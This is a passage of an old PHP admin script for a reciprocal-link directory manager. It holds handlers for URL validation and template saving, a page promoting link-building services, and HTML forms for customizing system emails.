      fputs($fp, "GET ".$_SERVER['SCRIPT_NAME']."?action=urlvalidationgo&user=$user&pass=$pass&startid=$startid HTTP/1.1\r\nAccept: */*\r\nAccept-Language: es-mx\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\r\nHost: ".$_SERVER['SERVER_NAME']."\r\nConnection: Close\r\n\r\n");   
      fclose($fp);
   }      
   else {
      $fp = fsockopen($_SERVER['SERVER_NAME'], 80);
      fputs($fp, "GET ".$_SERVER['SCRIPT_NAME']."?user=$user&pass=$pass&action=urlvalidationrecheck HTTP/1.1\r\nAccept: */*\r\nAccept-Language: es-mx\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)\r\nHost: ".$_SERVER['SERVER_NAME']."\r\nConnection: Close\r\n\r\n");
		fclose($fp);
   }      
   
   message("URL Validation in progress...", "LMA is now restarting the unfinished URL Validation. You will receive an e-mail when this process is complete");
}

elseif ($action == "urlvalidationcancel") {  
  $pol = mysql_query("delete from lma_custom where id = 'urlvalidationid'");
  
  message("URL Validation Cancelled...", "LMA has cancelled the URL Validation process.");
}

elseif ($action == "templates") {

?>

	<?echo $headr?>

<form action="admin.php" method="post" style="margin: 0px">
<input type="hidden" name="action" value="savetemplates">


<div align="center">
  <center>
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
            <p align="right"><a href="admin.php"><font size="2" face="Tahoma">Main
            Admin</font></a></p>
                </td>
              </tr>
              <tr>
                <td>
            <p align="center"><b><font face="Trebuchet MS" size="4">Customize
            Directory Templates</font></b></p>
            <p align="left"><font size="2" face="Tahoma">The Link Management
            Assistant contains a complete set of customizable templates allowing
            you to seamlessly integrate your niche website directory of link
            partners into your website. However, the default templates that
            accompany this script are very rudimentary and are really only
            included as examples as to what you can do (or your website
            designer) with your directory design and layout. If you're not familiar
            with editing HTML templates please refer to the user manual for more
            information and/or visit the support forums for guidance from other
            users.</font></p>
  </center>
                <p align="right"><font size="2" face="Tahoma"><a href="templates/includes.htm" target="_blank">
                Template Includes</a></font></p>
  <center>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><font size="2" face="Tahoma"><u>Main Index</u></font></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">This template generates the
                  main index page that displays the major categories in your directory.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
            <tr>
              <td>
                <p align="center"><font face="Trebuchet MS" size="2"><textarea rows="20" name="maintpl" cols="80" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(implode("", file("templates/main.html")))?></textarea></font></p>
                </td>
              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><font size="2" face="Tahoma"><u>Category
                  Index Pages</u></font></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">This template generates all of
                  the major category pages in your website.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
            <tr>
              <td>
                <p align="center"><font face="Trebuchet MS" size="2"><textarea rows="20" name="cattpl" cols="80" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(implode("", file("templates/category.html")))?></textarea></font></p>
                </td>
              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><font size="2" face="Tahoma"><u>Subcategory
                  Index Pages</u></font></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">This template generates all of
                  the sub-category pages in your website. It can be identical to
                  the main category index page template for consistency across
                  the directory, however has been included here incase you would
                  like to alter it slightly.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
            <tr>
              <td>
                <p align="center"><font face="Trebuchet MS" size="2"><textarea rows="20" name="subcattpl" cols="80" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(implode("", file("templates/subcategory.html")))?></textarea></font></p>
                </td>
              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><font size="2" face="Tahoma"><u>Add Website
                  Page</u></font></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">This is the page where other
                  webmasters can submit their listings into your niche website
                  directory.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
            <tr>
              <td>
                <p align="center"><font face="Trebuchet MS" size="2"><textarea rows="20" name="addtpl" cols="80" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(implode("", file("templates/add.html")))?></textarea></font></p>
                </td>
              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><font size="2" face="Tahoma"><u>Search
                  Results Page</u></font></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">This template generates the
                  search results page displayed when a visitor uses the search
                  feature of the directory, assuming you are including that
                  search box include in your templates.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
            <tr>
              <td>
                <p align="center"><font face="Trebuchet MS" size="2"><textarea rows="20" name="searchtpl" cols="80" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(implode("", file("templates/search.html")))?></textarea></font></p>
                </td>
              </tr>
            </table>
  <p><font face="Trebuchet MS" size="2"><input type="submit" value="Update Templates" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
            <p><font size="2" face="Tahoma">NOTE: Be sure you've specified your
            thank you page (the page where users are redirected to after
            submitting a website to your directory) in the general settings
            area.</font></center>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </div>
    </td>
  </tr>
  </table>
</div>

</form>
  <?echo $footr?>

<?

}

elseif ($action == "savetemplates") {

	$fp = fopen("templates/main.html", "w");
	fputs($fp, stripslashes($maintpl));
	fclose($fp);

	$fp = fopen("templates/category.html", "w");
	fputs($fp, stripslashes($cattpl));
	fclose($fp);

	$fp = fopen("templates/subcategory.html", "w");
	fputs($fp, stripslashes($subcattpl));
	fclose($fp);

	$fp = fopen("templates/add.html", "w");
	fputs($fp, stripslashes($addtpl));
	fclose($fp);

	$fp = fopen("templates/search.html", "w");
	fputs($fp, stripslashes($searchtpl));
	fclose($fp);

	message("Congratulations!", "Your templates were successfully modified.");

}

elseif ($action == "partners") {

	echo $headr;

?>

<div align="center">
  <center>
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
            <p align="right"><a href="admin.php"><font size="2" face="Tahoma">Main
            Admin</font></a></p>
                </td>
              </tr>
              <tr>
                <td>
            <p align="center"><b><font face="Trebuchet MS" size="4">Find More
            Link Partners</font></b></p>
            <p align="left"><font size="2" face="Tahoma">This section contains
            some very powerful resources that will help you find more strategic
            link partners for your directory to improve your link popularity
            &amp; search engine positions. Remember that finding link partners
            is just a numbers game. The more targeted webmasters you contact,
            the more partners you're going to secure. It requires continual
            effort and commitment and your initial target should be to find at
            least two hundred, if not five hundred link partners...</font></p>
  </center>
                <div align="center">
                  <table border="0" cellpadding="4" cellspacing="4" width="85%">
                    <tr>
                      <td width="101%" valign="top">
                        <hr size="1" color="#C0C0C0">
                      </td>
                    </tr>
                    <tr>
                      <td width="101%" valign="top">
                        <p align="left"><font size="2" face="Tahoma"><b><a href="http://www.digitalpoint.com/tools/ad-network/?s=2055" target="_blank">Digital
                        Point Advertising Co-Operative</a></b></font></p>
                        <p align="left"><font size="2" face="Tahoma">I have seen
                        excellent results participating in the free Digital
                        Point Advertising Co-Operative. Both in terms of the
                        dramatically improved search engine rankings and the
                        traffic it generates directly. Essentially you place
                        between 1-5 other members text links throughout the
                        pages on your website, and in exchange your own text
                        link is displayed on other members websites. The amount
                        of exposure you receive on the network is determined by
                        the number of other members ads you decide to display on
                        your own website, and the number of pages your website
                        has indexed in Google.</font></p>
                        <p align="left"><font size="2" face="Tahoma">At the time
                        of this writing, there are currently over 4,000 unique
                        websites / domains participating in the co-op, giving
                        you the potential to generate a lot of unique incoming
                        backlinks to help boost your search engine rankings. I
                        currently have this operating on approximately half of
                        my own websites and at the time of this writing would
                        recommend it as a great way to automatically increase
                        your link popularity. The co-op is also Link Management
                        Assistant compatible.</font></p>
                        <p align="left"><font size="2" face="Tahoma">Visit this
                        link to <b><a href="http://www.digitalpoint.com/tools/ad-network/?s=2055" target="_blank">JOIN
                        THE CO-OP NOW</a></b></font></td>
                    </tr>
                    <tr>
                      <td width="100%" valign="top">
                        <p align="left"></td>
                    </tr>
                  </table>
                </div>
  <center>
  </center>
                <div align="center">
                  <table border="0" cellpadding="4" cellspacing="4" width="85%">
                    <tr>
                      <td width="101%" valign="top">
                        <hr size="1" color="#C0C0C0">
                      </td>
                    </tr>
                    <tr>
                      <td width="101%" valign="top">
                        <p align="left"><font size="2" face="Tahoma"><b><a href="http://www.affiliatefinderpro.com/swres/cbdcam.html" target="_blank">Affiliate
                        Finder Professional</a></b></font></p>
                        <p align="left"><font size="2" face="Tahoma">Affiliate
                        Finder Pro totally automates the process of finding new
                        strategic link partners for your niche website
                        directory. It will search several of the most popular
                        search engines based on the keyword terms you specify,
                        and then automatically find the contact information
                        (name, email address etc) of those website owners who
                        already have excellent search engine exposure, making
                        them ideal strategic linking partners.</font></p>
                        <p align="left"><font size="2" face="Tahoma">You can
                        then use the application to send your personalized link
                        exchange proposals
                        directly to those contacts, or import the information
                        into your own mailing list management software to make
                        the process even more efficient. If
                        you're looking to secure hundreds of strategic link
                        partners &amp; increase your search engine rankings extremely
                        fast you can't afford NOT to own a copy of Affiliate
                        Finder Pro. </font></p>
                        <p align="left"><font size="2" face="Tahoma">I highly
                        recommend it &amp; use it weekly. <b><a href="http://www.affiliatefinderpro.com/swres/cbdcam.html" target="_blank">DOWNLOAD
                        IT NOW</a></b></font></td>
                    </tr>
                    <tr>
                      <td width="101%" valign="top">
                        <p align="left"></td>
                    </tr>
                  </table>
                </div>
                <div align="center">
                  <table border="0" cellpadding="4" cellspacing="4" width="85%">
                    <tr>
                      <td width="101%" valign="top">
                        <hr size="1" color="#C0C0C0">
                      </td>
                    </tr>
                    <tr>
                      <td width="101%" valign="top">
                        <p align="left"><font size="2" face="Tahoma"><b><a href="http://www.onlinemarketingtoday.com/services/text-link-advertising.htm" target="_blank">Duncan
                        Carver's Text Link Advertising Packages</a></b></font></p>
                        <p align="left"><font size="2" face="Tahoma">If you
                        cannot wait to increase your websites link popularity
                        &amp; would prefer to purchase text link advertising on
                        one of several independent networks of websites I
                        personally control you might like to check to see what I
                        have available. Often when I have have more inventory
                        available than I personally use, I will make a few text
                        link advertising packages available to selected clients.</font></p>
                        <p align="left"><font size="2" face="Tahoma">Given the scarcity
                        of the inventory however, it's proven performance in
                        increasing search engine rankings, and high client
                        retention rates, it is not often that I have any
                        available. To check to see if I have anything available
                        at the moment and current rates visit the link below.&nbsp;</font></p>
                        <p align="left"><font size="2" face="Tahoma">Check
                        current availability here. <b><a href="http://www.onlinemarketingtoday.com/services/text-link-advertising.htm" target="_blank">TEXT
                        LINK ADVERTISING</a></b></font></td>
                    </tr>
                    <tr>
                      <td width="101%" valign="top">
                        <p align="left"></td>
                    </tr>
                  </table>
                </div>
                </td>
              </tr>
  <center>
              <tr>
                <td height="20"></td>
              </tr>
  </center>
            </table>
          </td>
        </tr>
      </table>
    </div>
    </td>
  </tr>
  </table>
</div>
<?

	echo $footr;

}

elseif ($action == "emails") {

	echo $headr;

?>

<div align="center">
  <center>
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
            <p align="right"><a href="admin.php"><font size="2" face="Tahoma">Main
            Admin</font></a></p>
                </td>
              </tr>
              <tr>
                <td>
            <p align="center"><b><font face="Trebuchet MS" size="4">Email
            Management</font></b></p>
            <p align="left"><font size="2" face="Tahoma">This section
                  allows you to customize the emails that are sent out via the
            Link Management Assistant, both administrative emails, and those
            delivered to link partners when certain actions occur. You can also
            send a personalized broadcast email to all link partners or specific
            groups of partners.</font></p>
  </center>
                <p align="right"><font size="2" face="Tahoma"><a href="templates/personlization.htm" target="_blank">Personalization
                Fields</a></font></p>
                </td>
              </tr>
  <center>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Email Link
                  Partners</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">To email your link partners or
                  specific groups of link partners, simply fill out the
                  respective fields below and click the &quot;Email Now&quot;
                  button. The email will be sent from the address you've
                  specified in the &quot;General Settings&quot; area of the Link
                  Management Assistant.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
  </center>
            <tr>
              <td>
                <div align="center">


                	<form action="admin.php" method="post" style="margin: 0px">
                	<input type="hidden" name="action" value="massmail">


                  <table border="0" cellpadding="4" cellspacing="4" width="85%">
                    <center>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Subject:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><input type="text" name="subject" size="60" style="font-family: Verdana; font-size: 8pt"></font></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Message
                    Body:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><textarea rows="10" name="body" cols="60" style="font-family: Verdana; font-size: 8pt"></textarea></font></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font size="2" face="Tahoma">Who?&nbsp;</font></td>
                  <td width="50%" align="left" valign="top"><font size="2" face="Tahoma"><select size="1" name="who" style="font-family: Verdana; font-size: 8pt">
                    <option value="all">All Partners</option>
                    <option value="active">Active Partners</option>
                    <option value="premium">Premium Partners</option>
                    <option value="suspended">Suspended Partners</option>
                    </select> </font></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font size="2" face="Tahoma"><a href="help/workm.htm" target="_blank">Work mode</a>&nbsp;</font></td>
                  <td width="50%" align="left" valign="top"><font size="2" face="Tahoma"><select size="1" name="mode" style="font-family: Verdana; font-size: 8pt">
                    <option value="screen" selected>On-screen</option>
                    <option value="bg">Background</option>
                    </select> </font></td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2">
                    <p align="center"><font face="Tahoma" size="2"><input type="submit" value="Email Partners Now" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
                  </td>
                </tr>
                    </table>
                  </div>

                  </form>

                </center>
                </td>
              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Customize
                  System Emails</font></u></b></td>
              </tr>

         <form action="admin.php" method="post" style="margin: 0px">
         <input type="hidden" name="action" value="updateemails">

              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">The following group of customizable
                  emails are sent when specific actions occur during the day to
                  day operations of running the Link Management Assistant. To
                  edit the emails, simply make the respective changes and click
                  the &quot;Update Emails&quot; button towards the bottom of the
                  page. You can edit all emails at once, all changes will be
                  saved when you click the update button.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td height="20">&nbsp;
                  <div align="center">
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2">
                          <p align="left"><font size="2" face="Tahoma"><b>Email
                          Confirmation Message (Sent To Listing Submitter)</b></font></p>
                          <p align="left"><font face="Tahoma" size="1">Sent to
                          all new directory submissions only if you have
                          &quot;email confirmation required&quot; turn on. If
                          turned on, people must confirm their email address
                          before their listing either goes live in the
                          directory, or is placed into your awaiting approval
                          que.</font></td>
                      </tr>
                      <center>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2">
                    <hr size="1" color="#C0C0C0">
                  </td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Subject:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><input type="text" name="confirmsubject" size="60" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize(array_shift(mysql_fetch_row(mysql_query("select subject from lma_emails where id = 'confirm'"))))?>"></font></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Message
                    Body:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><textarea rows="10" name="confirmbody" cols="60" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(array_shift(mysql_fetch_row(mysql_query("select body from lma_emails where id = 'confirm'"))))?></textarea></font></td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                      </table>
                    </div>


                </center>
                  <div align="center">
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2"></td>
                      </tr>
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2">
                          <p align="left"><font size="2" face="Tahoma"><b>Submission
                          Received Email (Sent To Listing Submitter)</b></font></p>
                          <p align="left"><font face="Tahoma" size="1">This is
                          the email sent to all new directory submissions. If admin approval
                          is not required, this e-mail will let them know that their site
                          is now listed on your directory.</font></td>
                      </tr>
                      <center>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2">
                    <hr size="1" color="#C0C0C0">
                  </td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Subject:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><input type="text" name="addedsubject" size="60" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize(array_shift(mysql_fetch_row(mysql_query("select subject from lma_emails where id = 'added'"))))?>"></font></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Message
                    Body:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><textarea rows="10" name="addedbody" cols="60" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(array_shift(mysql_fetch_row(mysql_query("select body from lma_emails where id = 'added'"))))?></textarea></font></td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                      </table>
                    </div>
                </center>

                  <div align="center">
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2"></td>
                      </tr>
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2">
                          <p align="left"><font size="2" face="Tahoma"><b>Listing
                          Approval Email (Sent To Listing Submitter)</b></font></p>
                          <p align="left"><font face="Tahoma" size="1">This is
                          the email sent to all new directory submissions when
                          their listing is approved (only if you have
                          &quot;require admin approval&quot; turn on for new
                          submissions).</font></td>
                      </tr>
                      <center>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2">
                    <hr size="1" color="#C0C0C0">
                  </td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Subject:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><input type="text" name="approvedsubject" size="60" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize(array_shift(mysql_fetch_row(mysql_query("select subject from lma_emails where id = 'approved'"))))?>"></font></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Message
                    Body:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><textarea rows="10" name="approvedbody" cols="60" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(array_shift(mysql_fetch_row(mysql_query("select body from lma_emails where id = 'approved'"))))?></textarea></font></td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                      </table>
                    </div>
                </center>
                  <div align="center">
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2"></td>
                      </tr>
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2">
                          <p align="left"><font size="2" face="Tahoma"><b>Listing
                          Declined Email (Sent To Listing Submitter)</b></font></p>
                          <p align="left"><font face="Tahoma" size="1">This is
                          the email sent to all new directory submissions if you
                          chose to decline their listing for whatever reason
                          (only if you have &quot;require admin approval&quot;
                          turn on for new submissions).</font></td>
                      </tr>
                      <center>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2">
                    <hr size="1" color="#C0C0C0">
                  </td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Subject:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><input type="text" name="declinedsubject" size="60" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize(array_shift(mysql_fetch_row(mysql_query("select subject from lma_emails where id = 'declined'"))))?>"></font></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Message
                    Body:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><textarea rows="10" name="declinedbody" cols="60" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(array_shift(mysql_fetch_row(mysql_query("select body from lma_emails where id = 'declined'"))))?></textarea></font></td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                      </table>
                    </div>
                </center>
                  <div align="center">
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2"></td>
                      </tr>
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2">
                          <p align="left"><font size="2" face="Tahoma"><b>Link
                          Not Found Email (Sent To Listing Submitter)</b></font></p>
                          <p align="left"><font face="Tahoma" size="1">This is
                          the email sent to reciprocal link partners when the
                          link back to your website is not found on their own website
                          during the routine automatic checking.</font></td>
                      </tr>
                      <center>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2">
                    <hr size="1" color="#C0C0C0">
                  </td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Subject:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><input type="text" name="removedsubject" size="60" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize(array_shift(mysql_fetch_row(mysql_query("select subject from lma_emails where id = 'removed'"))))?>"></font></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Message
                    Body:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><textarea rows="10" name="removedbody" cols="60" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(array_shift(mysql_fetch_row(mysql_query("select body from lma_emails where id = 'removed'"))))?></textarea></font></td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                      </table>
                    </div>
                </center>
                  <div align="center">
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2"></td>
                      </tr>
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2">
                          <p align="left"><font size="2" face="Tahoma"><b>Listing
                          Removed Email (Sent To Listing Submitter)</b></font></p>
                          <p align="left"><font face="Tahoma" size="1">This is
                          the email sent to reciprocal link partners whose reciprocating
                          link could not be found several days after they have received
                          the above &quot;link not found&quot; email.</font></td>
                      </tr>
                      <center>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2">
                    <hr size="1" color="#C0C0C0">
                  </td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Subject:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><input type="text" name="deletedsubject" size="60" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize(array_shift(mysql_fetch_row(mysql_query("select subject from lma_emails where id = 'deleted'"))))?>"></font></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Message
                    Body:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><textarea rows="10" name="deletedbody" cols="60" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(array_shift(mysql_fetch_row(mysql_query("select body from lma_emails where id = 'deleted'"))))?></textarea></font></td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                      </table>
                    </div>
                </center>
                  <div align="center">
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2"></td>
                      </tr>
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2">
                          <p align="left"><font size="2" face="Tahoma"><b>New
                          Directory Submission (Sent To Admin)</b></font></p>
                          <p align="left"><font face="Tahoma" size="1">This is
                          the email is sent to you as the administrator letting
                          you know a new submission has been made to the
                          directory. If you are running in &quot;admin approval
                          mode&quot; you will then know when you need to login
                          and review a new submission.</font></td>
                      </tr>
                      <center>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2">
                    <hr size="1" color="#C0C0C0">
                  </td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Subject:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><input type="text" name="newsubject" size="60" style="font-family: Verdana; font-size: 8pt" value="<?echo fieldize(array_shift(mysql_fetch_row(mysql_query("select subject from lma_emails where id = 'new'"))))?>"></font></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Message
                    Body:</font></td>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2"><textarea rows="10" name="newbody" cols="60" style="font-family: Verdana; font-size: 8pt"><?echo htmlentities(array_shift(mysql_fetch_row(mysql_query("select body from lma_emails where id = 'new'"))))?></textarea></font></td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                      </table>
                    </div>
                </center>
                  <div align="center">
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2"></td>
                      </tr>
                      <tr>
                        <td width="100%" align="left" valign="top" colspan="2">
                          <p align="left"><font size="2" face="Tahoma"><b>Listing
                          Suspended (Sent To Admin)</b></font></p>
                          <p align="left"><font face="Tahoma" size="1">This is
                          the email is sent to you as the administrator letting
                          you know a listing has been suspended as no
                          reciprocal link could be found after several checks on
                          the partners website. NOTE: When such an event occurs,
                          the listing owner is also sent an email so (see
                          above), so this email is simply to let you know so you
                          can personally investigate the matter.</font></td>
                      </tr>
                      <center>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2">
                    <hr size="1" color="#C0C0C0">
                  </td>
                </tr>
                <tr>
                  <td width="100%" align="left" valign="top" colspan="2"></td>
                </tr>
                <tr>
                  <td width="50%" align="left" valign="top"><font face="Tahoma" size="2">Subject:</font></td>
